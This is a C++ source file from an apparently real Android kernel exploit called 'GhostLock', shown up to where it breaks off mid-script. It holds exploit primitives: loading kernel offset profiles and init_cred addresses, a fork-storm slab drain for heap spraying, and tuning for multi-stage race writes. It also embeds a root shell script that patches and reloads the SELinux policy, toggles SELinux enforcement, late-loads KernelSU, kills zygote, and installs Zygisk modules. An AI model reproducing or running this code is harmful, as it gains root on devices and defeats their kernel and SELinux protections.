/*
 * GhostLock — attack primitives, launch/profile selection and timing.
 *
 * Split out of main.cpp so the orchestration entry stays a thin adapter. The
 * statement order and log text are unchanged from the original translation
 * unit.
 */

#include "attack/ops.hpp"
#include "support/fatal_error.hpp"

#include "session/exploit_session.hpp"

#include <algorithm>
#include <array>
#include <string>
#include <string_view>
#include <linux/perf_event.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/utsname.h>

namespace ghostlock::attack {
    void log_execution_settings(const profile::kernel_offsets *profile) {
        if (!profile) return;
        const profile::execution_settings *e = &profile->execution;
        const auto log_exec = [](const char *key, auto value) {
            pr_info("debug.execution.%s=%u\n", key, static_cast<unsigned>(value));
        };
        pr_info("debug.execution.begin release=%s\n", profile->uname_r);
        log_exec("recommended_cpus.main", e->recommended_main_cpu);
        log_exec("recommended_cpus.consumer", e->recommended_consumer_cpu);
        log_exec("selected_cpus.main", config::runtime_config_snapshot().main_cpu);
        log_exec("selected_cpus.consumer", config::runtime_config_snapshot().consumer_cpu);
        log_exec("heap.prepare_max_attempts", e->heap_prepare_max_attempts);
        log_exec("heap.prepare_timeout_ms", e->heap_prepare_timeout_ms);
        log_exec("heap.kernelsnitch_timeout_ms", e->heap_kernelsnitch_timeout_ms);
        log_exec("race.route_wait_ms", e->race_route_wait_ms);
        log_exec("race.setup_settle_us", e->race_setup_settle_us);
        log_exec("race.state_poll_interval_us", e->race_state_poll_interval_us);
        log_exec("stages.w1_attempts", e->w1_attempts);
        log_exec("stages.w1_settle_us", e->w1_settle_us);
        log_exec("stages.w1_scratch_repair_attempts", e->w1_scratch_repair_attempts);
        log_exec("stages.w2_attempts", e->w2_attempts);
        log_exec("stages.w2_settle_us", e->w2_settle_us);
        log_exec("stages.w3_chain_rounds", e->w3_chain_rounds);
        log_exec("stages.w3_attempts", e->w3_attempts);
        log_exec("stages.w3_settle_us", e->w3_settle_us);
        log_exec("routes.tcp_zerocopy.attempts", e->tcp_attempts);
        log_exec("routes.tcp_zerocopy.arm_sequence", e->tcp_arm_sequence);
        log_exec("routes.tcp_zerocopy.post_receive_hold_iterations",
                 e->tcp_post_receive_hold_iterations);
        log_exec("routes.select_stack.enter_delay_us", e->select_enter_delay_us);
        log_exec("routes.select_stack.timeout_us", e->select_timeout_us);
        log_exec("routes.select_stack.consumer_max_calls", e->select_consumer_max_calls);
        log_exec("routes.select_stack.consumer_burst_calls",
                 e->select_consumer_burst_calls);
        log_exec("handoff.pre_dispatch_settle_ms", e->handoff_pre_dispatch_settle_ms);
        log_exec("handoff.module_poll_attempts", e->handoff_module_poll_attempts);
        log_exec("handoff.module_poll_interval_ms", e->handoff_module_poll_interval_ms);
        log_exec("handoff.enforce_poll_attempts", e->handoff_enforce_poll_attempts);
        log_exec("handoff.enforce_poll_interval_ms", e->handoff_enforce_poll_interval_ms);
        pr_info("debug.execution.end\n");
    }

    /* Entries carry a phys load address only when measured; otherwise MTK uses
     * the DRAM base, xring its constant, qcom its GKI version. */
    void resolve_profile_addresses(void) {
        if (session::g_exploit_session.addresses.init(&session::g_exploit_session.profile) != 0)
            throw FatalError{};
        pr_info("soc: %s; kernel_phys_load=0x%llx\n",
                session::g_exploit_session.addresses.soc_name(&session::g_exploit_session.profile),
                (unsigned long long) session::g_exploit_session.addresses.phys_load());
        pr_info("init_cred image=%016zx alias=%016zx\n",
                (size_t) session::g_exploit_session.addresses.init_cred_image_addr(),
                (size_t) session::g_exploit_session.addresses.data_alias(
                    session::g_exploit_session.addresses.init_cred_image_addr()));
    }

    void install_profile(const profile::kernel_offsets &decoded) {
        struct utsname uts;
        if (uname(&uts) < 0) throw FatalError{};
        pr_info("kernel: %s\n", uts.release);
#ifdef TARGET_KERNEL_RELEASE
        if (std::string_view(uts.release) != TARGET_KERNEL_RELEASE) {
            pr_error("build requires kernel %s, got %s\n",
                     TARGET_KERNEL_RELEASE, uts.release);
            throw FatalError{};
        }
#endif
        if (!decoded.uname_r || std::string_view(decoded.uname_r) != uts.release) {
            pr_error("profile release mismatch: expected %s, got %s\n", uts.release,
                     decoded.uname_r ? decoded.uname_r : "<missing>");
            throw FatalError{};
        }
        /* PROFILE-SUGGEST-01: execution tuning arrives fully merged from Kotlin;
         * the native side only consumes the resolved values. */
        session::g_exploit_session.profile = profile::TargetProfile::from(&decoded);
        pr_success("resolved profile loaded: %s\n",
                   session::g_exploit_session.profile.release());
        if (config::runtime_config_snapshot().apply_profile(&session::g_exploit_session.profile) != 0)
            throw FatalError{};
        config::runtime_config_snapshot().log();
        log_execution_settings(session::g_exploit_session.profile.values());
        resolve_profile_addresses();
    }

    /* Lowest start and highest end of the System RAM banks in a /proc/iomem dump.
     * A nested bank lies inside its parent, so it cannot widen either bound. */
    static int32_t iomem_map_span(FILE *f, uint64_t *map_span) {
        unsigned long long base = 0, top = 0;
        char *line = nullptr;
        size_t cap = 0;
        int32_t found = 0;

        while (getline(&line, &cap, f) > 0) {
            size_t len = strlen(line);
            unsigned long long a, b;
            int32_t used = 0;

            while (len && (line[len - 1] == '\n' || line[len - 1] == '\r')) {
                line[--len] = '\0';
            }
            /* %n pins the match to the whole line, since sscanf returns 2 even when
             * a trailing literal mismatches */
            if (sscanf(line, " %llx-%llx : System RAM%n", &a, &b, &used) == 2 &&
                used == static_cast<int32_t>(len)) {
                if (!found || a < base) {
                    base = a;
                    found = 1;
                }
                if (b + 1 > top) top = b + 1;
            }
        }
        /* Kept as the C getline/free pair: the ScopeExit experiment grew
         * run_setup_stage by 5 instructions (CPP17 review, rejected). */
        free(line);

        /* the map starts at the dram base the kernel rounded down to a gib, which
         * is what memstart_addr holds */
        base &= ~((1ULL << 30) - 1);
        if (!found || top <= base) return 0;
        *map_span = top - base;
        return 1;
    }

    /* A rooted run leaves its /proc/iomem in the home dir, the only source for
     * this unit's direct map size. */
    void apply_iomem_cache(void) {
        std::array < char, 320 > path{};
        std::array < char, 192 > stamp{};
        uint64_t span = 0;
        int32_t ok = 0;
        const profile::kernel_offsets *values =
                session::g_exploit_session.profile.values();
        const char *release = values && values->uname_r ? values->uname_r : "";

        snprintf(path.data(), path.size(), "%s/.ghostlock_iomem", (config::runtime_config_snapshot().home_dir.c_str()));
        if (FILE *f = fopen(path.data(), "r")) {
            auto close_iomem = ghostlock::support::make_scope_exit(
                [f]() noexcept { fclose(f); });
            /* the first line names the release that wrote the dump */
            if (fgets(stamp.data(), static_cast<int32_t>(stamp.size()), f)) {
                /* strcspn returns an index inside the buffer; the store writes the
                 * terminating NUL at worst on the last byte. */
                stamp[strcspn(stamp.data(), "\r\n")] = '\0'; // NOLINT(clang-analyzer-security.ArrayBound)
                const std::string_view stamp_view(stamp.data());
                ok = stamp_view.starts_with("# ") &&
                     stamp_view.substr(2) == release &&
                     iomem_map_span(f, &span);
            }
        }

        /* the base is rounded down to a gib, so a span under that holds no real
         * bank, and the span has to cover the dram the unit reports. it also
         * stays inside the bound the built-in geometry already uses, so a measured
         * end can only narrow what this build would otherwise trust. an
         * unmeasurable ram rejects the dump */
        long pages = sysconf(_SC_PHYS_PAGES), page_sz = sysconf(_SC_PAGE_SIZE);
        uint64_t dram = (pages > 0 && page_sz > 0)
                            ? static_cast<uint64_t>(pages) * static_cast<uint64_t>(page_sz)
                            : 0;
        if (!ok || !dram || span < (1ULL << 30) || span < dram ||
            span >= kernel::DIRECT_MAP_END - kernel::DIRECT_MAP_BASE) {
            pr_info("iomem cache: no usable dump, keeping the built-in geometry\n");
            return;
        }

        kernel::g_direct_map_end = kernel::DIRECT_MAP_BASE + span;
        pr_info("iomem cache: direct_map_end=%016llx\n",
                (unsigned long long) kernel::g_direct_map_end);
    }

    void slab_drain(void) {
        /* Keep this light in untrusted_app. Aggressive fork storms trip LMK/OOM
         * (exit 137) especially right before heap spray. */
        struct timespec up;
        clock_gettime(CLOCK_BOOTTIME, &up);
        int32_t waves = (up.tv_sec > 60) ? 2 : 1;
        int32_t batch = (up.tv_sec > 60) ? 64 : 32;
        for (int32_t wave = 0; wave < waves; wave++) {
            /* Fixed upper bound (batch <= 64): no heap and no vector exception
             * paths in this pre-attack drain. */
            std::array<support::ChildProcess, 64> drain;
            int32_t n = 0;
            for (int32_t i = 0; i < batch; i++) {
                pid_t pid = fork();
                if (pid == 0) {
                    pause();
                    _exit(0);
                }
                if (pid > 0) {
                    if (n >= static_cast<int32_t>(drain.size())) break;
                    drain[static_cast<size_t>(n++)] = support::ChildProcess(pid);
                } else {
                    break;
                }
            }
            /* kill + reap in the original order, now owned by ChildProcess */
            for (int32_t i = 0; i < n; i++) (void) drain[static_cast<size_t>(i)].terminate_and_wait(SIGKILL);
            sched_yield();
            usleep(20000);
        }
    }

    void write_root_script(void) {
        std::string script(28672, '\0');
        support::UniqueFd sfd(
            open((config::runtime_config_snapshot().root_script_path.c_str()), O_WRONLY | O_CREAT | O_TRUNC, 0755));
        if (!sfd.valid()) {
            pr_warning("open root script failed path=%s errno=%d\n",
                       (config::runtime_config_snapshot().root_script_path.c_str()), errno);
            return;
        }

        int32_t n = snprintf(
            script.data(), script.size(),
            "#!/system/bin/sh\n"
            "HOME_DIR='%s'\n"
            "LOG='%s'\n"
            "SAFE_MODE=%d\n"
            "KSUD='%s'\n"
            "LSPD_MODULES='%s'\n"
            "SELINUX_FIXUP='%s'\n"
            "PHASE='%s'\n"
            "STATUS=\"$HOME_DIR/.ghostlock_status\"\n"
            "RUN_ID=$(date +%%s 2>/dev/null)\n"
            "BOOT_ID=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)\n"
            "STATE=starting\n"
            "BUSY=1\n"
            "READY=0\n"
            "ERROR=\n"
            "SUPERVISOR_PID=0\n"
            "write_status() {\n"
            "  { echo 'schema=1'; echo \"run_id=$RUN_ID\"; echo \"boot_id=$BOOT_ID\"; echo \"pid=$SUPERVISOR_PID\"; echo \"state=$STATE\"; echo \"busy=$BUSY\"; echo \"ready=$READY\"; echo \"error=$ERROR\"; echo \"log=$LOG\"; echo \"updated=$(date +%%s 2>/dev/null)\"; } >\"$STATUS.tmp\" && chmod 644 \"$STATUS.tmp\" 2>/dev/null && mv \"$STATUS.tmp\" \"$STATUS\"\n"
            "  if [ \"$STATE\" = \"ready\" ] || [ \"$STATE\" = \"failed\" ]; then rm -f \"$HOME_DIR/.ghostlock_run_started\" 2>/dev/null; fi\n"
            "}\n"
            "on_exit() {\n"
            "  RC=$?\n"
            "  if [ \"$RC\" -ne 0 ] && [ \"$STATE\" != \"failed\" ] && [ \"$STATE\" != \"ready\" ]; then\n"
            "    STATE=failed; BUSY=0; READY=0; ERROR=\"script exited $RC\"; write_status\n"
            "    echo \"[!] script exited $RC; marked failed\" >>\"$LOG\"\n"
            "  fi\n"
            "}\n"
            "trap on_exit EXIT\n"
            "echo \"[*] root script start uid=$(id -u) euid=$(id -u)\" >\"$LOG\"\n"
            "chmod 644 \"$LOG\" 2>/dev/null\n"
            "if [ -f \"$STATUS\" ]; then\n"
            "  OLD_BOOT=$(sed -n 's/^boot_id=//p' \"$STATUS\" | head -1)\n"
            "  OLD_PID=$(sed -n 's/^pid=//p' \"$STATUS\" | head -1)\n"
            "  if [ \"$OLD_BOOT\" = \"$BOOT_ID\" ] && [ -n \"$OLD_PID\" ] && [ \"$OLD_PID\" != 0 ] && kill -0 \"$OLD_PID\" 2>/dev/null; then\n"
            "    if [ \"$PHASE\" = \"root\" ]; then\n"
            "      echo \"[!] supervisor already running pid=$OLD_PID; not starting another run\" >>\"$LOG\"\n"
            "      exit 0\n"
            "    fi\n"
            "    echo \"[*] stopping previous supervisor pid=$OLD_PID for $PHASE\" >>\"$LOG\"\n"
            "    kill -15 \"$OLD_PID\" 2>/dev/null\n"
            "    sleep 1\n"
            "    kill -9 \"$OLD_PID\" 2>/dev/null\n"
            "  fi\n"
            "fi\n"
            "write_status\n"
            "if [ \"$PHASE\" = \"reboot\" ]; then\n"
            "  echo '[*] soft reboot: root and modules stay loaded' >>\"$LOG\"\n"
            "  if [ \"$(id -u)\" != \"0\" ]; then\n"
            "    STATE=failed; BUSY=0; READY=0; ERROR='soft reboot needs root'; write_status\n"
            "    echo 'op:reboot fail: not root' >>\"$LOG\"\n"
            "    exit 1\n"
            "  fi\n"
            "  MP=$(pidof zygisk-ptrace64 2>/dev/null | awk '{print $1}')\n"
            "  TP=$(sed -n 's/^TracerPid:[[:space:]]*//p' /proc/1/status 2>/dev/null)\n"
            "  if [ -z \"$MP\" ] || [ \"$TP\" != \"$MP\" ]; then\n"
            "    STATE=failed; BUSY=0; READY=0; ERROR='rezygisk monitor not tracing init'; write_status\n"
            "    echo \"op:reboot fail: monitor=$MP init_tracer=$TP\" >>\"$LOG\"\n"
            "    exit 1\n"
            "  fi\n"
            "  P=$(pidof zygote64 2>/dev/null | tr -d '\\r' | awk '{print $1}')\n"
            "  if [ -z \"$P\" ]; then\n"
            "    STATE=failed; BUSY=0; READY=0; ERROR='zygote64 not found'; write_status\n"
            "    echo 'op:reboot fail: zygote64 not found' >>\"$LOG\"\n"
            "    exit 1\n"
            "  fi\n"
            "  STATE=soft_reboot; BUSY=1; READY=0; ERROR=; write_status\n"
            "  rm -f /data/adb/rezygisk/state.json\n"
            "  echo \"op:reboot kill: zygote64 pid=$P\" >>\"$LOG\"\n"
            "  kill -9 \"$P\"\n"
            "  i=0\n"
            "  while [ $i -lt 120 ]; do\n"
            "    if [ -f /data/adb/rezygisk/state.json ] && \\\n"
            "       grep -q '\"64\": 1' /data/adb/rezygisk/state.json; then\n"
            "      break\n"
            "    fi\n"
            "    sleep 1\n"
            "    i=$((i+1))\n"
            "  done\n"
            "  if [ $i -ge 120 ]; then\n"
            "    STATE=failed; BUSY=0; READY=0; ERROR='zygote injection timeout'; write_status\n"
            "    echo 'op:reboot fail: zygote injection timeout' >>\"$LOG\"\n"
            "    exit 1\n"
            "  fi\n"
            "  if [ ! -x /data/adb/modules/zygisk_vector/daemon ]; then\n"
            "    STATE=failed; BUSY=0; READY=0; ERROR='Vector daemon missing'; write_status\n"
            "    echo 'op:reboot fail: Vector daemon missing' >>\"$LOG\"\n"
            "    exit 1\n"
            "  fi\n"
            "  if [ -z \"$(pidof vectord)\" ]; then\n"
            "    echo '[*] vectord gone; restarting it after system_server settles' >>\"$LOG\"\n"
            "    sleep 60\n"
            "    nohup unshare -m /data/adb/modules/zygisk_vector/daemon --system-server-max-retry=3 >/data/local/tmp/vectord.log 2>&1 &\n"
            "  fi\n"
            "  CLI_OK=0; STATE_OK=0; i=0\n"
            "  while [ $i -lt 12 ]; do\n"
            "    if [ $CLI_OK = 0 ] && timeout 15 /data/adb/modules/zygisk_vector/cli status 2>&1 | grep -q 'Framework Version'; then\n"
            "      CLI_OK=1\n"
            "    fi\n"
            "    if [ $STATE_OK = 0 ] && grep -q 'zygisk_vector' /data/adb/rezygisk/state.json 2>/dev/null; then\n"
            "      STATE_OK=1\n"
            "    fi\n"
            "    if [ $CLI_OK = 1 ] && [ $STATE_OK = 1 ]; then break; fi\n"
            "    sleep 5\n"
            "    i=$((i+1))\n"
            "  done\n"
            "  if [ \"$CLI_OK\" = 1 ] && [ \"$STATE_OK\" = 1 ]; then\n"
            "    STATE=ready; BUSY=0; READY=1; ERROR=; write_status\n"
            "    echo 'op:reboot ok' >>\"$LOG\"\n"
            "    exit 0\n"
            "  fi\n"
            "  STATE=failed; BUSY=0; READY=0; ERROR='Vector verify failed'; write_status\n"
            "  echo 'op:reboot fail: Vector verify failed' >>\"$LOG\"\n"
            "  exit 1\n"
            "fi\n"
            "touch /data/local/tmp/.ghostlock_vector_managed 2>/dev/null\n"
            "if touch /data/adb/ghostlock-vector-managed 2>/dev/null; then\n"
            "  echo '[*] managed marker pre-created' >>\"$LOG\"\n"
            "else\n"
            "  echo '[!] cannot pre-create /data/adb marker' >>\"$LOG\"\n"
            "fi\n"
            "echo \"[*] seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
            "if [ ! -x \"$KSUD\" ]; then\n"
            "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu.pr*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
            "fi\n"
            "if [ ! -x \"$KSUD\" ]; then\n"
            "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu-*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
            "fi\n"
            "if [ ! -x \"$KSUD\" ]; then\n"
            "  KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
            "fi\n"
            "if [ ! -x \"$KSUD\" ]; then\n"
            "  KSUD=$(find /data/app -path '*/org.bakasu.bakasu-*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
            "fi\n"
            "if [ ! -x \"$KSUD\" ]; then\n"
            "  KSUD=$(find /data/app -path '*/com.kowx712.supermanager*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
            "fi\n"
            "if [ -z \"$KSUD\" ]; then KSUD=/data/local/tmp/ksud; fi\n"
            "if [ ! -x \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
            "echo \"[*] ksud=$KSUD\" >>\"$LOG\"\n"
            "echo \"[*] ksud_file=$(ls -l \"$KSUD\" 2>/dev/null)\" >>\"$LOG\"\n"
            "cp \"$KSUD\" /data/local/tmp/.ghostlock_ksud 2>/dev/null\n"
            "chmod 755 /data/local/tmp/.ghostlock_ksud 2>/dev/null\n"
            "echo \"[*] uname=$(uname -r)\" >>\"$LOG\"\n"
            "if [ \"$(id -u)\" -ne 0 ]; then\n"
            "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
            "  exit 1\n"
            "fi\n"
            "echo \"# $(uname -r)\" >\"$HOME_DIR/.ghostlock_iomem.new\"\n"
            "if cat /proc/iomem >>\"$HOME_DIR/.ghostlock_iomem.new\" 2>/dev/null && grep -q 'System RAM' \"$HOME_DIR/.ghostlock_iomem.new\"; then\n"
            "  mv \"$HOME_DIR/.ghostlock_iomem.new\" \"$HOME_DIR/.ghostlock_iomem\"\n"
            "  chmod 644 \"$HOME_DIR/.ghostlock_iomem\" 2>/dev/null\n"
            "  echo \"[*] iomem cache: cached $(wc -c <\"$HOME_DIR/.ghostlock_iomem\") bytes\" >>\"$LOG\"\n"
            "else\n"
            "  rm -f \"$HOME_DIR/.ghostlock_iomem.new\"\n"
            "  echo '[!] iomem cache: /proc/iomem read failed' >>\"$LOG\"\n"
            "fi\n"
            "if [ -d /sys/fs/pstore ]; then\n"
            "  mkdir -p \"$HOME_DIR/pstore\" 2>/dev/null\n"
            "  cp /sys/fs/pstore/* \"$HOME_DIR/pstore/\" 2>/dev/null\n"
            "  PSN=$(ls \"$HOME_DIR/pstore\" 2>/dev/null | wc -l)\n"
            "  [ \"$PSN\" -gt 0 ] && echo \"[*] pstore captured files=$PSN\" >>\"$LOG\"\n"
            "fi\n"
            "DEBUG_DIR=\"%s\"\n"
            "dump_debug() {\n"
            "  [ -n \"$DEBUG_DIR\" ] || return 0\n"
            "  if ! mkdir -p \"$DEBUG_DIR/pstore\" 2>/dev/null; then\n"
            "    DEBUG_DIR=/data/local/tmp/ghostlock-debug-$$.d; mkdir -p \"$DEBUG_DIR/pstore\" 2>/dev/null || return 0\n"
            "  fi\n"
            "  {\n"
            "    echo '== uname -a =='\n"
            "    uname -a\n"
            "    echo '== /proc/version =='\n"
            "    cat /proc/version\n"
            "    echo '== /proc/cmdline =='\n"
            "    cat /proc/cmdline\n"
            "    echo '== /proc/modules =='\n"
            "    cat /proc/modules\n"
            "    echo '== selinux =='\n"
            "    getenforce 2>/dev/null\n"
            "  } >\"$DEBUG_DIR/kernel-info.txt\" 2>&1\n"
            "  if ! dmesg >\"$DEBUG_DIR/kernel-dmesg.log\" 2>&1; then\n"
            "    echo '[!] dmesg unavailable' >>\"$DEBUG_DIR/kernel-dmesg.log\"\n"
            "  fi\n"
            "  for f in /sys/fs/pstore/*; do\n"
            "    [ -f \"$f\" ] || continue\n"
            "    cp \"$f\" \"$DEBUG_DIR/pstore/\" 2>/dev/null\n"
            "  done\n"
            "  cp /proc/iomem \"$DEBUG_DIR/iomem.txt\" 2>/dev/null\n"
            "  cp \"$LOG\" \"$DEBUG_DIR/ksu.log\" 2>/dev/null\n"
            "  echo \"[*] debug dump written to $DEBUG_DIR\" >>\"$LOG\"\n"
            "}\n"
            "# W1's 64-bit child pointer makes adjacent booleans non-zero.\n"
            "echo 0 > /sys/fs/selinux/checkreqprot 2>/dev/null\n"
            "if grep -q '^kernelsu[[:space:]]' /proc/modules 2>/dev/null; then\n"
            "  echo '[+] KernelSU already loaded' >>\"$LOG\"\n"
            "fi\n"
            "KVER=$(uname -r | cut -d. -f1-2)\n"
            "AVER=$(uname -r | grep -o 'android[0-9]*' | head -1)\n"
            "if [ -z \"$AVER\" ] || [ -z \"$KVER\" ]; then\n"
            "  echo '[!] cannot parse KMI from uname -r' >>\"$LOG\"\n"
            "  exit 1\n"
            "fi\n"
            "KMI=\"${AVER}-${KVER}\"\n"
            "# safe mode: disable all modules before exec ksud\n"
            "if [ \"$SAFE_MODE\" = \"1\" ]; then\n"
            "  echo \"[*] safe mode: disabling all modules under /data/adb/modules\" >>\"$LOG\"\n"
            "  n=0\n"
            "  for m in /data/adb/modules/*/; do\n"
            "    [ -d \"$m\" ] || continue\n"
            "    if touch \"${m}disable\" 2>/dev/null; then\n"
            "      n=$((n+1))\n"
            "      echo \"  disabled ${m}\" >>\"$LOG\"\n"
            "    fi\n"
            "  done\n"
            "  echo \"[*] safe mode: $n module(s) disabled\" >>\"$LOG\"\n"
            "fi\n"
            "# step 1: restore policy\n"
            "POLICY=$(mktemp \"$HOME_DIR/.ghostlock_policy.XXXXXX\") || {\n"
            "  echo '[!] cannot create policy dump' >>\"$LOG\"\n"
            "  exit 1\n"
            "}\n"
            "trap 'rm -f \"$POLICY\"; dump_debug' EXIT\n"
            "prepare_policy() {\n"
            "  cat /sys/fs/selinux/policy >\"$POLICY\" || return 1\n"
            "  HEADER=$(od -An -tx1 -N24 \"$POLICY\" | tr -d ' \\n')\n"
            "  case \"$HEADER\" in\n"
            "    8cff7cf9080000005345204c696e7578????????????????) ;;\n"
            "    *) echo '[!] invalid policy header'; return 1 ;;\n"
            "  esac\n"
            "  # Restore missing Android netlink flags: bits 30/31, byte 23.\n"
            "  CONFIG=$(od -An -tu1 -j23 -N1 \"$POLICY\") || return 1\n"
            "  [ -n \"$CONFIG\" ] || return 1\n"
            "  CONFIG=$(printf '\\\\0%%03o' \"$((CONFIG | 192))\" || return 1)\n"
            "  printf '%%b' \"$CONFIG\" | dd of=\"$POLICY\" bs=1 seek=23 count=1 conv=notrunc\n"
            "}\n"
            /* Phase 2 of a two-step run: root already loaded KernelSU and left a
             * working ksud, so the whole prologue below (policy reload ->
             * late-load -> re-enforce) only repeats what is already true. */
            "PROLOGUE_SKIP=0\n"
            "if [ \"$PHASE\" = \"activate\" ] && grep -q '^kernelsu[[:space:]]' /proc/modules 2>/dev/null && [ -x \"$KSUD\" ]; then\n"
            "  PROLOGUE_SKIP=1\n"
            "  echo '[*] phase=activate with KernelSU in memory; skipping policy fixup and late-load' >>\"$LOG\"\n"
            "fi\n"
            "FIXUP_RC=1\n"
            "if [ \"$SELINUX_FIXUP\" = \"1\" ] && [ \"$PROLOGUE_SKIP\" != \"1\" ]; then\n"
            "for i in $(seq 1 10); do\n"
            "  echo \"[*] fixup: attempt $i\" >>\"$LOG\"\n"
            "  if ! prepare_policy >>\"$LOG\" 2>&1; then\n"
            "    sleep 2\n"
            "    continue\n"
            "  fi\n"
            "  BEFORE_POLICYLOAD=$(od -An -tu4 -j12 -N4 /sys/fs/selinux/status 2>/dev/null | tr -d ' ')\n"
            "  load_policy \"$POLICY\" >>\"$LOG\" 2>&1 &\n"
            "  LPID=$!\n"
            "  (sleep 8; kill -9 $LPID 2>/dev/null) &\n"
            "  SPID=$!\n"
            "  wait $LPID 2>/dev/null\n"
            "  FIXUP_RC=$?\n"
            "  kill $SPID 2>/dev/null\n"
            "  if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
            "    AFTER_POLICYLOAD=$(od -An -tu4 -j12 -N4 /sys/fs/selinux/status 2>/dev/null | tr -d ' ')\n"
            "    echo \"[*] policyload before=$BEFORE_POLICYLOAD after=$AFTER_POLICYLOAD\" >>\"$LOG\"\n"
            "    if [ -n \"$AFTER_POLICYLOAD\" ] && [ \"$AFTER_POLICYLOAD\" != \"$BEFORE_POLICYLOAD\" ]; then\n"
            "      break\n"
            "    fi\n"
            "    echo '[!] load_policy returned success without updating SELinux status' >>\"$LOG\"\n"
            "    FIXUP_RC=1\n"
            "  fi\n"
            "  sleep 2\n"
            "done\n"
            "echo \"[*] policy fixup rc=$FIXUP_RC\" >>\"$LOG\"\n"
            "else\n"
            "  FIXUP_RC=2\n"
            "  if [ \"$PROLOGUE_SKIP\" = \"1\" ]; then\n"
            "    echo '[*] policy reload skipped (prologue skipped)' >>\"$LOG\"\n"
            "  else\n"
            "    echo '[*] policy reload skipped (SELINUX_FIXUP=0)' >>\"$LOG\"\n"
            "  fi\n"
            "fi\n"
            "if [ \"$FIXUP_RC\" -eq 0 ] || [ \"$FIXUP_RC\" -eq 2 ]; then\n"
            "# Late-load runs before any module install: ksud's \"module install\"\n"
            "# asks the kernel for its UAPI version, which is 0 until the\n"
            "# KernelSU module is actually in memory, and a 0-vs-5 mismatch\n"
            "# aborts the Zygisk/LSPosed stack. The app route (SELINUX_FIXUP=0)\n"
            "# used to defer this to the end of the run, after the install, so\n"
            "# the install always failed there.\n"
            "if [ \"$PROLOGUE_SKIP\" != \"1\" ]; then\n"
            "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
            "  KSU_ALREADY=1\n"
            "  echo \"[*] kernelsu loaded but su missing; re-running late-load to mount su\" >>\"$LOG\"\n"
            "  chmod 755 \"$KSUD\" 2>/dev/null\n"
            "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
            "  echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
            "else\n"
            "  KSU_ALREADY=0\n"
            "  if [ ! -x \"$KSUD\" ]; then\n"
            "    echo '[!] ksud missing; cannot late-load' >>\"$LOG\"\n"
            "    exit 1\n"
            "  fi\n"
            "  echo \"[*] late-load kmi=$KMI\" >>\"$LOG\"\n"
            "  chmod 755 \"$KSUD\" 2>/dev/null\n"
            "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
            "  echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
            "fi\n"
            "echo \"[*] temp su uid=$(id -u); watching kernelsu.ko\" >>\"$LOG\"\n"
            "KSU_READY=0\n"
            "for i in $(seq 1 50); do\n"
            "  if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; break; fi\n"
            "  sleep 0.1\n"
            "done\n"
            "if [ \"$KSU_READY\" -ne 1 ]; then\n"
            "  echo '[!] KernelSU module not loaded' >>\"$LOG\"\n"
            "  exit 1\n"
            "fi\n"
            "echo '[+] KernelSU module loaded' >>\"$LOG\"\n"
            "else\n"
            "  KSU_ALREADY=0\n"
            /* KernelSU is already loaded and owns selinux policy; re-enforcing
             * here switches the shell from permissive to enforcing mid-run, and
             * the shell's context (shell:s0) then loses write access to the
             * app_data_file log/status, blinding the rest of the script. Let
             * KernelSU manage enforcing and keep running under the live state. */
            "  ENFORCE=$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
            "  echo \"[*] prologue skipped; selinux enforce=$ENFORCE\" >>\"$LOG\"\n"
            /* The skipped block is where the debug-dump trap gets installed;
             * without it a failure before the finisher leaves no dump. */
            "  trap dump_debug EXIT\n"
            "fi\n"
            "if [ \"$KSU_ALREADY\" -eq 1 ] && [ \"$SELINUX_FIXUP\" = \"1\" ]; then\n"
            "  echo \"[*] kernelsu already loaded; restoring enforcing\" >>\"$LOG\"\n"
            "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
            "fi\n"
            "STATE=root; write_status\n"
            "if [ -n \"$LSPD_MODULES\" ]; then\n"
            "  STATE=installing; write_status\n"
            "  MODZIP_DIR=\"$LSPD_MODULES\"\n"
            "  echo \"[*] modules dir=$MODZIP_DIR\" >>\"$LOG\"\n"
            "  KSU_KSUD=/data/adb/ksu/bin/ksud\n"
            "  if [ ! -x \"$KSU_KSUD\" ]; then\n"
            "    if [ -x /data/local/tmp/.ghostlock_ksud ]; then\n"
            "      KSU_KSUD=/data/local/tmp/.ghostlock_ksud\n"
            "    elif [ -x \"$KSUD\" ]; then\n"
            "      KSU_KSUD=\"$KSUD\"\n"
            "    fi\n"
            "    echo \"[*] installed ksud missing; using $KSU_KSUD\" >>\"$LOG\"\n"
            "  fi\n"
            /* Already uid 0 (the exploit's init_cred child), so the stack runs
             * right here. This used to route through a su/exec wrapper script,
             * which dropped the arguments and always failed; and it required
             * SELINUX_FIXUP=1, so the app route demanded a working su -- the
             * one thing unusable after the KernelSU module init re-enforces
             * SELinux. run_root() keeps both routes on one call shape. */
            "  if [ \"$(id -u)\" = \"0\" ]; then\n"
            "    SU=''\n"
            "    echo '[*] already root: stack steps run in-process' >>\"$LOG\"\n"
            "  else\n"
            "    SU=''\n"
            "    for cand in /system/bin/su /system/xbin/su; do\n"
            "      SUOUT=$(timeout 10 \"$cand\" -c 'echo ghostlock-su-ok' 2>&1)\n"
            "      case \"$SUOUT\" in *ghostlock-su-ok*) SU=\"$cand\"; break;; esac\n"
            "    done\n"
            "    echo \"[*] su=${SU:-none}\" >>\"$LOG\"\n"
            "  fi\n"
            /* Dispatch: empty SU runs the command in this shell, which is
             * already root on the exploit route. */
